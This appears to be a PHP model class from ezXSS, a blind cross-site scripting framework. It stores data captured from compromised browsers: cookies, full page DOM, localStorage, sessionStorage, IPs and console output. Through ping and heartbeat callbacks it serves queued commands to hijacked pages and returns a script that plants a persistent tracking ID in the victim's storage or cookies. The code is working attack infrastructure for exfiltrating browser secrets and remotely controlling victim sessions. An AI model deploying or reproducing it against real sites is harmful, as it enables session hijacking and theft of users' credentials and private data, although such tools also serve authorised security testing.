<?php
class Session extends Model
{
    protected static $table = 'sessions';
    protected static $primaryKey = 'id';

    /**
     * The sessions_data table (big blobs).
     */
    const TABLE_DATA = 'sessions_data';

    /**
     * Truncation limits for the light columns.
     */
    const LIMIT_CLIENT    = 50;
    const LIMIT_PAYLOAD   = 255;
    const LIMIT_URI       = 1000;
    const LIMIT_IP        = 50;
    const LIMIT_REFERER   = 1000;
    const LIMIT_USERAGENT = 500;
    const LIMIT_ORIGIN    = 500;
    const LIMIT_COOKIES   = 1048576;

    /**
     * Light summary columns for the grouped list / request history.
     */
    const SUMMARY_COLUMNS = array(
        'id', 'client_id', 'payload', 'uri', 'ip', 'referer', 'useragent',
        'origin', 'archive', 'created_at', 'updated_at',
    );

    /**
     * Handle a persistent-mode callback: init stores a session row, ping updates it.
     *
     * @param array $data
     * @return string
     */
    public static function handleCallback($data)
    {
        $type = isset($data->type) ? (string) $data->type : '';
        $clientId = isset($data->clientid) ? (string) $data->clientid : '';
        $origin = isset($data->origin) ? (string) $data->origin : '';
        $payload = isset($data->payload) ? self::normalizePayloadIdentifier((string) $data->payload) : null;
        if ($payload === '') {
            $payload = null;
        }

        if ($type === 'heartbeat') {
            $session = self::findLatest($clientId, $origin, $payload);

            if (!$session) {
                return '';
            }

            self::query()->where('id', (int) $session['id'])->update(array('updated_at' => time()));

            if ((int) $session['archive'] === 1) {
                self::toggleArchive($clientId, $origin, $payload);
            }

            return Console::hasPending($clientId, $origin, $payload) ? '1' : '0';
        }

        if ($type === 'ping') {
            $session = self::findLatest($clientId, $origin, $payload);

            if (!$session) {
                if ($clientId !== '') {
                    $known = self::clientExists(substr($clientId, 0, self::LIMIT_CLIENT));
                    self::storeInit($data);
                    if (!$known) {
                        return self::adoptScript($data->clientid);
                    }
                }
                return '';
            }

            self::updatePing((int) $session['id'], isset($data->console) ? (string) $data->console : '');

            if ((int) $session['archive'] === 1) {
                self::toggleArchive($clientId, $origin, $payload);
            }

            return Console::getNext($clientId, $origin, $payload);
        }

        self::storeInit($data);
        return (string) (isset($data->clientid) ? $data->clientid : '');
    }

    /**
     * Store a persistent session (a light `sessions` row + a `sessions_data` blob row).
     *
     * @param array $data
     */
    public static function storeInit($data)
    {
        $now = time();

        $clientId = utf8CleanCut($data->clientid ?? '', self::LIMIT_CLIENT);
        if ($clientId === '' || !self::clientExists($clientId)) {
            $clientId = self::generateClientId();
        }
        $data->clientid = $clientId;

        $sessionId = (int) self::query()->insert(array(
            'client_id'  => $clientId,
            'payload'    => utf8CleanCut(self::normalizePayloadIdentifier($data->payload ?? ''), self::LIMIT_PAYLOAD),
            'uri'        => utf8CleanCut($data->uri ?? '', self::LIMIT_URI),
            'ip'         => utf8CleanCut($data->ip ?? '', self::LIMIT_IP),
            'referer'    => utf8CleanCut($data->referer ?? '', self::LIMIT_REFERER),
            'useragent'  => utf8CleanCut($data->useragent ?? '', self::LIMIT_USERAGENT),
            'cookies'    => utf8CleanCut($data->cookies ?? '', self::LIMIT_COOKIES),
            'origin'     => utf8CleanCut($data->origin ?? '', self::LIMIT_ORIGIN),
            'archive'    => 0,
            'created_at' => $now,
            'updated_at' => $now,
        ));

        $dom = utf8Clean($data->dom ?? '');
        $localStorage = json_encode($data->localstorage ?? '');
        $sessionStorage = json_encode($data->sessionstorage ?? '');
        $console = utf8Clean($data->console ?? '');

        $compressed = 0;
        if (Compression::enabled()) {
            $dom = Compression::pack($dom);
            $localStorage = Compression::packJson($localStorage);
            $sessionStorage = Compression::packJson($sessionStorage);
            $console = Compression::pack($console);
            $compressed = 1;
        }

        self::query()->from(self::TABLE_DATA)->insert(array(
            'session_id'     => $sessionId,
            'dom'            => $dom,
            'localstorage'   => $localStorage,
            'sessionstorage' => $sessionStorage,
            'console'        => $console,
            'compressed'     => $compressed,
        ));

        return $sessionId;
    }

    /**
     * Whether any session row already carries this client id.
     *
     * @param string $clientId
     * @return bool
     */
    public static function clientExists($clientId)
    {
        return (bool) self::query()->where('client_id', $clientId)->first();
    }

    /**
     * Script a browser runs (via the ping response) to switch to a newly issued client id.
     *
     * @param string $clientId
     * @return string
     */
    public static function adoptScript($clientId)
    {
        $id = preg_replace('/[^A-Za-z0-9]/', '', (string) $clientId);
        $key = 'ezXSS_' . Setting::clientKey();
        $expires = gmdate('D, d M Y H:i:s', time() + 31536000) . ' GMT';

        return 'try{localStorage.setItem("' . $key . '","' . $id . '")}catch(e){ez_cid_fb="' . $id . '";document.cookie="' . $key . '=' . $id . ';expires=' . $expires . ';path=/"}';
    }

    /**
     * A unique, server-generated client id (collision-checked against existing sessions).
     */
    public static function generateClientId()
    {
        for ($i = 0; $i < 5; $i++) {
            $id = bin2hex(random_bytes(8));
            if (!self::query()->where('client_id', $id)->first()) {
                return $id;
            }
        }
        return bin2hex(random_bytes(12));
    }

    /**
     * The newest session row for a client/origin group, or null.
     *
     * @param string $clientId
     * @param string $origin
     */
    public static function findLatest($clientId, $origin, $payload = null)
    {
        $q = self::query()
            ->where('client_id', substr((string) $clientId, 0, self::LIMIT_CLIENT))
            ->where('origin', substr((string) $origin, 0, self::LIMIT_ORIGIN));
        self::scopePayload($q, $payload);
        $row = $q->orderBy('id', 'DESC')->first();

        return $row ?: null;
    }

    /**
     * Bump the session's updated_at and overwrite its console blob.
     *
     * @param int $sessionId
     * @param string $console
     */
    public static function updatePing($sessionId, $console)
    {
        $sessionId = (int) $sessionId;

        self::query()->where('id', $sessionId)->update(array('updated_at' => time()));

        $row = self::query()->from(self::TABLE_DATA)->where('session_id', $sessionId)->first();
        $compressed = $row && (int) (isset($row['compressed']) ? $row['compressed'] : 0) === 1;

        $console = utf8Clean($console);
        $stored = $compressed ? Compression::pack($console) : $console;

        self::query()->from(self::TABLE_DATA)
            ->where('session_id', $sessionId)
            ->update(array('console' => $stored));
    }

    /**
     * Toggle the archive flag (0 <-> 1) across every row of a group.
     *
     * @param string $clientId
     * @param string $origin
     * @return int|null
     */
    public static function toggleArchive($clientId, $origin, $payload = null)
    {
        $latest = self::findLatest($clientId, $origin, $payload);
        if (!$latest) {
            return null;
        }

        $new = ((int) $latest['archive'] === 0) ? 1 : 0;

        $q = self::query()
            ->where('client_id', substr((string) $clientId, 0, self::LIMIT_CLIENT))
            ->where('origin', substr((string) $origin, 0, self::LIMIT_ORIGIN));
        self::scopePayload($q, $payload);
        $q->update(array('archive' => $new));

        return $new;
    }

    /**
     * Set the archive flag to an explicit value across every row of a group.
     *
     * @param string $clientId
     * @param string $origin
     * @param string $flag
     */
    public static function setArchiveGroup($clientId, $origin, $flag, $payload = null)
    {
        $flag = ((int) $flag === 1) ? 1 : 0;

        $q = self::query()
            ->where('client_id', substr((string) $clientId, 0, self::LIMIT_CLIENT))
            ->where('origin', substr((string) $origin, 0, self::LIMIT_ORIGIN));
        self::scopePayload($q, $payload);
        $q->update(array('archive' => $flag));

        return $flag;
    }

    /**
     * Paginated grouped session listing: one entry per (client_id + origin + payload) group.
     *
     * @param array $opts
     * @return array
     */
    public static function listGroups(array $opts)
    {
        $db = Database::getInstance();

        $built = self::buildGroupWhere($opts);
        $whereSql = $built['where'];
        $recencySql = $built['recency']['sql'];
        $params = $built['params'];
        $allParams = array_merge($params, $built['recency']['params']);

        $groupSql = 'SELECT MAX(id) AS max_id, COUNT(*) AS requests FROM `sessions`'
            . $whereSql . ' GROUP BY `client_id`, `origin`, ' . self::PAYLOAD_IDENTIFIER_SQL;

        $countSql = 'SELECT COUNT(*) FROM (' . $groupSql . ') grp'
            . ' INNER JOIN `sessions` s ON s.id = grp.max_id'
            . $recencySql;
        $countStmt = $db->prepare($countSql);
        $countStmt->execute($allParams);
        $total = (int) $countStmt->fetchColumn();

        $page = QueryBuilder::page($opts, 25);

        $cols = 's.`' . implode('`, s.`', self::SUMMARY_COLUMNS) . '`';
        $sql = 'SELECT ' . $cols . ', grp.requests FROM `sessions` s'
            . ' INNER JOIN (' . $groupSql . ') grp ON s.id = grp.max_id'
            . $recencySql
            . ' ORDER BY s.`updated_at` DESC, s.`id` DESC'
            . ' LIMIT ' . $page['offset'] . ', ' . $page['limit'];

        $stmt = $db->prepare($sql);
        $stmt->execute($allParams);
        $rows = $stmt->fetchAll(PDO::FETCH_ASSOC);

        return array('rows' => $rows, 'total' => $total);
    }

    /**
     * Build the shared predicate set for the grouped-session queries.
     *
     * @param array $opts
     * @return array
     */
    private static function buildGroupWhere(array $opts)
    {
        $where = array();
        $params = array();

        $archive = isset($opts['archive']) ? (int) $opts['archive'] : 0;
        $where[] = '`archive` = ?';
        $params[] = $archive;

        if (!empty($opts['catchall'])) {
            $where[] = Payload::catchAllNotExistsSql('sessions');
        } elseif (isset($opts['payload']) && $opts['payload'] !== null && $opts['payload'] !== '') {
            $where[] = self::PAYLOAD_IDENTIFIER_SQL . ' = ?';
            $params[] = self::normalizePayloadIdentifier((string) $opts['payload']);
        }

        if (isset($opts['client_id']) && $opts['client_id'] !== null && $opts['client_id'] !== '') {
            $where[] = '`client_id` = ?';
            $params[] = substr((string) $opts['client_id'], 0, self::LIMIT_CLIENT);
        }

        if (array_key_exists('identifiers', $opts) && $opts['identifiers'] !== null) {
            $idents = array();
            foreach ((array) $opts['identifiers'] as $ident) {
                $idents[(string) $ident] = (string) $ident;
            }
            if (empty($idents)) {

                $where[] = '0 = 1';
            } else {
                $place = implode(', ', array_fill(0, count($idents), '?'));
                $where[] = self::PAYLOAD_IDENTIFIER_SQL . ' IN (' . $place . ')';
                foreach (array_values($idents) as $ident) {
                    $params[] = $ident;
                }
            }
        }

        $search = isset($opts['search']) ? trim((string) $opts['search']) : '';
        if ($search !== '') {
            $like = array();
            $term = QueryBuilder::escapeLike($search);
            foreach (array('origin', 'ip', 'useragent') as $c) {
                $like[] = '`' . $c . "` LIKE ? ESCAPE '\\\\'";
                $params[] = '%' . $term . '%';
            }
            $where[] = '(' . implode(' OR ', $like) . ')';
        }

        $recencySql = array();
        $recencyParams = array();
        if (isset($opts['seen_within']) && $opts['seen_within'] !== null && $opts['seen_within'] !== '') {
            $recencySql[] = 's.`updated_at` >= ?';
            $recencyParams[] = time() - (int) $opts['seen_within'];
        }
        if (isset($opts['seen_before']) && $opts['seen_before'] !== null && $opts['seen_before'] !== '') {
            $recencySql[] = 's.`updated_at` < ?';
            $recencyParams[] = time() - (int) $opts['seen_before'];
        }

        return array(
            'where'   => empty($where) ? '' : (' WHERE ' . implode(' AND ', $where)),
            'params'  => $params,
            'recency' => array(
                'sql'    => empty($recencySql) ? '' : (' WHERE ' . implode(' AND ', $recencySql)),
                'params' => $recencyParams,
            ),
        );
    }

    /**
     * Count the session groups matching $opts (the count half of listGroups).
     *
     * @param array $opts
     * @return int
     */
    public static function countGroups(array $opts)
    {
        $db = Database::getInstance();
        $built = self::buildGroupWhere($opts);

        $groupSql = 'SELECT MAX(id) AS max_id FROM `sessions`'
            . $built['where'] . ' GROUP BY `client_id`, `origin`, ' . self::PAYLOAD_IDENTIFIER_SQL;

        $sql = 'SELECT COUNT(*) FROM (' . $groupSql . ') grp'
            . ' INNER JOIN `sessions` s ON s.id = grp.max_id'
            . $built['recency']['sql'];

        $params = array_merge($built['params'], $built['recency']['params']);
        $stmt = $db->prepare($sql);
        $stmt->execute($params);
        return (int) $stmt->fetchColumn();
    }

    /**
     * The representative (MAX(id)) row id of every group matching $opts, newest first, bounded by limit.
     *
     * @param array $opts
     */
    public static function groupRepresentativeIds(array $opts)
    {
        $db = Database::getInstance();
        $built = self::buildGroupWhere($opts);

        $groupSql = 'SELECT MAX(id) AS max_id FROM `sessions`'
            . $built['where'] . ' GROUP BY `client_id`, `origin`, ' . self::PAYLOAD_IDENTIFIER_SQL;

        $limit = isset($opts['limit']) ? max(1, (int) $opts['limit']) : 200;

        $sql = 'SELECT grp.max_id FROM (' . $groupSql . ') grp'
            . ' INNER JOIN `sessions` s ON s.id = grp.max_id'
            . $built['recency']['sql']
            . ' ORDER BY s.`updated_at` DESC, s.`id` DESC'
            . ' LIMIT ' . $limit;

        $params = array_merge($built['params'], $built['recency']['params']);
        $stmt = $db->prepare($sql);
        $stmt->execute($params);

        $out = array();
        foreach ($stmt->fetchAll(PDO::FETCH_COLUMN) as $id) {
            $out[] = (int) $id;
        }
        return $out;
    }

    /**
     * SQL expression reducing a stored payload to its identifier.
     */
    const PAYLOAD_IDENTIFIER_SQL = "TRIM(TRAILING '/' FROM SUBSTRING_INDEX(COALESCE(`payload`, ''), '?', 1))";

    private static function scopePayload($q, $payload)
    {
        if ($payload === null) {
            return $q;
        }
        $q->whereRaw(self::PAYLOAD_IDENTIFIER_SQL . " = ?", array($payload));
        return $q;
    }

    public static function normalizePayloadIdentifier($raw)
    {
        return PayloadBuilder::normalizeIdentifier($raw);
    }

    /**
     * The distinct payload identifiers that have at least one session row.
     *
     * @param array $opts
     * @return array
     */
    public static function distinctPayloads(array $opts)
    {
        $db = Database::getInstance();

        $expr = self::PAYLOAD_IDENTIFIER_SQL;
        $where = array($expr . " <> ''");
        $params = array();

        if (array_key_exists('identifiers', $opts) && $opts['identifiers'] !== null) {
            $idents = array();
            foreach ((array) $opts['identifiers'] as $ident) {
                $idents[(string) $ident] = (string) $ident;
            }
            if (empty($idents)) {
                return array();
            }
            $place = implode(', ', array_fill(0, count($idents), '?'));
            $where[] = $expr . ' IN (' . $place . ')';
            foreach (array_values($idents) as $ident) {
                $params[] = $ident;
            }
        }

        $sql = 'SELECT DISTINCT ' . $expr . ' AS payload FROM `sessions` WHERE ' . implode(' AND ', $where)
            . ' ORDER BY payload ASC';

        $stmt = $db->prepare($sql);
        $stmt->execute($params);

        $out = array();
        foreach ($stmt->fetchAll(PDO::FETCH_COLUMN) as $payload) {
            $out[] = (string) $payload;
        }
        return $out;
    }

    /**
     * All rows for a group (navigation/request history), newest first.
     *
     * @param string $clientId
     * @param string $origin
     */
    public static function requestsFor($clientId, $origin, $payload = null)
    {
        $q = self::query()
            ->select(implode(', ', self::SUMMARY_COLUMNS))
            ->where('client_id', substr((string) $clientId, 0, self::LIMIT_CLIENT))
            ->where('origin', substr((string) $origin, 0, self::LIMIT_ORIGIN));
        self::scopePayload($q, $payload);
        return $q->orderBy('id', 'DESC')->get();
    }

    /**
     * One page of a group's request history, newest first, with optional search and a matching total.
     *
     * @param string $clientId
     * @param string $origin
     * @param array $opts
     * @return array
     */
    public static function requestsPage($clientId, $origin, array $opts = array(), $payload = null)
    {
        $q = self::query()
            ->where('client_id', substr((string) $clientId, 0, self::LIMIT_CLIENT))
            ->where('origin', substr((string) $origin, 0, self::LIMIT_ORIGIN));
        self::scopePayload($q, $payload);

        $search = isset($opts['search']) ? trim((string) $opts['search']) : '';
        if ($search !== '') {
            $term = '%' . QueryBuilder::escapeLike($search) . '%';
            $like = array();
            $params = array();
            foreach (array('uri', 'ip', 'useragent', 'origin', 'referer') as $c) {
                $like[] = '`' . $c . "` LIKE ? ESCAPE '\\\\'";
                $params[] = $term;
            }
            $q->whereRaw('(' . implode(' OR ', $like) . ')', $params);
        }

        $total = (int) $q->count();

        $page = QueryBuilder::page($opts, 50);
        $rows = $q->select(self::SUMMARY_COLUMNS)
            ->orderBy('id', 'DESC')
            ->limit($page['limit'], $page['offset'])
            ->get();

        return array('rows' => $rows, 'total' => $total);
    }

    /**
     * The number of request rows in a group.
     *
     * @param string $clientId
     * @param string $origin
     */
    public static function requestCount($clientId, $origin, $payload = null)
    {
        $q = self::query()
            ->where('client_id', substr((string) $clientId, 0, self::LIMIT_CLIENT))
            ->where('origin', substr((string) $origin, 0, self::LIMIT_ORIGIN));
        self::scopePayload($q, $payload);
        return (int) $q->count();
    }

    /**
     * The decompressed blob row for a session (dom/localstorage/sessionstorage/console).
     *
     * @param int $sessionId
     * @return array
     */
    public static function dataFor($sessionId)
    {
        $row = self::query()->from(self::TABLE_DATA)->where('session_id', (int) $sessionId)->first();

        if (!$row) {
            return array('dom' => '', 'localstorage' => '', 'sessionstorage' => '', 'console' => '');
        }

        if ((int) (isset($row['compressed']) ? $row['compressed'] : 0) === 1) {
            $row['dom'] = Compression::unpack($row['dom']);
            $row['localstorage'] = Compression::unpackJson($row['localstorage']);
            $row['sessionstorage'] = Compression::unpackJson($row['sessionstorage']);
            $row['console'] = Compression::unpack($row['console']);
        }

        return array(
            'dom'            => isset($row['dom']) ? $row['dom'] : '',
            'localstorage'   => isset($row['localstorage']) ? $row['localstorage'] : '',
            'sessionstorage' => isset($row['sessionstorage']) ? $row['sessionstorage'] : '',
            'console'        => isset($row['console']) ? $row['console'] : '',
        );
    }

    /**
     * The concatenated decompressed console output across every row of a group, newest-first.
     *
     * @param string $clientId
     * @param string $origin
     */
    public static function consoleOutput($clientId, $origin, $payload = null)
    {
        $console = '';
        foreach (self::requestsFor($clientId, $origin, $payload) as $row) {
            $data = self::dataFor((int) $row['id']);
            $console .= $data['console'];
        }
        return $console;
    }

    /**
     * Delete an entire group: every `sessions` row, its `sessions_data` blob rows, and its `console` commands.
     *
     * @param string $clientId
     * @param string $origin
     * @return int
     */
    public static function deleteGroup($clientId, $origin, $payload = null)
    {
        $clientId = substr((string) $clientId, 0, self::LIMIT_CLIENT);
        $origin = substr((string) $origin, 0, self::LIMIT_ORIGIN);

        $q = self::query()
            ->select('id')
            ->where('client_id', $clientId)
            ->where('origin', $origin);
        self::scopePayload($q, $payload);
        $rows = $q->get();

        foreach ($rows as $row) {
            self::query()->from(self::TABLE_DATA)->where('session_id', (int) $row['id'])->delete();
        }

        $dq = self::query()->where('client_id', $clientId)->where('origin', $origin);
        self::scopePayload($dq, $payload);
        $dq->delete();
        Console::deleteFor($clientId, $origin, $payload);

        return count($rows);
    }

    /**
     * Dashboard session statistics.
     *
     * @param array $opts
     */
    public static function dashboardStats(array $opts)
    {
        $where = '';
        $params = array();

        if (array_key_exists('identifiers', $opts) && $opts['identifiers'] !== null) {
            $idents = array();
            foreach ((array) $opts['identifiers'] as $ident) {
                $idents[(string) $ident] = (string) $ident;
            }
            if (empty($idents)) {
                return self::emptySessionStats();
            }
            $place = implode(', ', array_fill(0, count($idents), '?'));
            $where = ' WHERE ' . self::PAYLOAD_IDENTIFIER_SQL . ' IN (' . $place . ')';
            foreach (array_values($idents) as $ident) {
                $params[] = $ident;
            }
        }

        $db = Database::getInstance();
        $stmt = $db->prepare(
            'SELECT `client_id`, `origin`, `created_at` FROM `sessions`' . $where . ' ORDER BY `id` ASC'
        );
        $stmt->execute($params);

        $weekAgo = time() - 604800;
        $stats = self::emptySessionStats();
        $clients = array();
        $weekClients = array();
        $domains = array();
        $last = null;

        while ($row = $stmt->fetch(PDO::FETCH_ASSOC)) {
            $stats['session_requests']++;
            $client = (string) (isset($row['client_id']) ? $row['client_id'] : '');
            $origin = (string) (isset($row['origin']) ? $row['origin'] : '');
            $time = (int) (isset($row['created_at']) ? $row['created_at'] : 0);

            if ($time > $weekAgo) {
                $stats['session_requests_week']++;
                if ($client !== '' && !isset($weekClients[$client])) {
                    $weekClients[$client] = true;
                    $stats['session_clients_week']++;
                }
            }
            if ($client !== '' && !isset($clients[$client])) {
                $clients[$client] = true;
                $stats['session_clients']++;
            }
            if ($origin !== '' && !isset($domains[$origin])) {
                $domains[$origin] = true;
                $stats['session_domains']++;
            }
            $last = $time;
        }

        $stats['last_client'] = $last;
        return $stats;
    }

    /**
     * Zeroed session stat map (the shape dashboardStats always returns).
     *
     * @return array
     */
    private static function emptySessionStats()
    {
        return array(
            'session_requests'      => 0,
            'session_requests_week' => 0,
            'session_clients'       => 0,
            'session_clients_week'  => 0,
            'session_domains'       => 0,
            'last_client'           => null,
        );
    }

}
